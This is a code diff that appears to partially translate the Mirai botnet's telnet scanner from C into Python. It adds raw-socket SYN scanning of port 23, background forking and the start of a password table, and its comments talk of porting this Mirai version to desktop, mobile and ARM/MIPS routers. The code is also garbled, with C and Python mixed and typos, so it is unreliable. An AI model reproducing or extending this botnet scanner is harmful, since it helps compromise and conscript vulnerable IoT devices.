@@ -2,7 +2,7 @@ import os, fcntl, errno
 _GNU_SOURCE	= #ifdef MIRAI_TELNET
 
 #ifdef DEBUG
-import sys
+import sys, socket, ctypes
 #endif
 #include <unistd.h>
 #include <sys/socket.h>
@@ -26,8 +26,23 @@ import time
 
 auth_table_len = 0
 scanner_rawpkt[sizeof (struct iphdr) + sizeof (struct tcphdr)] = {0}
-struct scanner_auth *auth_table = NULL
-struct scanner_connection *conn_table
+# struct scanner_auth *auth_table = NULL
+class scanner_auth(object):
+    def __init__(self, auth_table):
+        self.auth_table = auth_table
+
+class scanner_connection(object):
+    def __init__(self, conn_table):
+        self.conn_table = conn_table
+
+def ntohs(string):
+    string = socket.ntohs(string)
+    return string
+
+def htons(string):
+    string = socket.htons(string)
+    return stringk
+# struct scanner_connection *conn_table
 auth_table_max_weight = 0
 fake_time = 0
 
@@ -45,8 +60,15 @@ def recv_strip_null(sock, buf, len, flags):
     return ret
 
 def scanner_init():
-    struct iphdr *iph
-    struct tcphdr *tcph
+    class iphdr(object):
+        def __init__(self, iph):
+            self.iph = iph
+
+    class tcphdr(object):
+        def __init__(self, tcph):
+            self.tcph = tcph
+    # struct iphdr *iph
+    # struct tcphdr *tcph
 
     # Let parent continue on main thread
     scanner_pid = os.fork()
@@ -57,13 +79,19 @@ def scanner_init():
 
     rand_init()
     fake_time = time.time()
-    conn_table = calloc(SCANNER_MAX_CONNS, sizeof (struct scanner_connection))
+    conn_table = calloc(SCANNER_MAX_CONNS, sizeof (scanner_connection))
     for i in range(SCANNER_MAX_CONNS):
         conn_table[i].state = SC_CLOSED
         conn_table[i].fd = -1
-
+        # eventually we will need to fix this because first of all...
+        # we do not have to open files so primitively in Python
+        # nor do we have to do much with file descriptors
+        # but it may come in handy from a compatibility standpoint since Mirai targets non-x86 architectures as well
+        # with pyinstaller, this version of Mirai would only be installable on Windows, Linux, and Mac, possily Android and iPhones
+        # but a more streamlined version must be made for IoT devices like routers running ARM or MIPS
     # Set up raw socket scanning and payload
-    if (rsck = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1:
+    # if (rsck = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1:
+    if (rsck = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)) == -1:
 #ifdef DEBUG
         printf("[scanner] Failed to initialize raw socket, cannot scan\n")
 #endif
@@ -78,7 +106,7 @@ def scanner_init():
         os.exit(0)
 
     while True:
-        source_port = rand_next() & 0xffff
+        source_port = rand_next()
         if not (ntohs(source_port) < 1024): break	# DO-WHILE TERMINATOR -- INDENTATION CAN BE WRONG
 
     iph = (struct iphdr *)scanner_rawpkt
@@ -96,7 +124,7 @@ def scanner_init():
     tcph.dest = htons(23)
     tcph.source = source_port
     tcph.doff = 5
-    tcph.window = rand_next() & 0xffff
+    tcph.window = rand_next()
     tcph.syn = True
 
     # Set up passwords
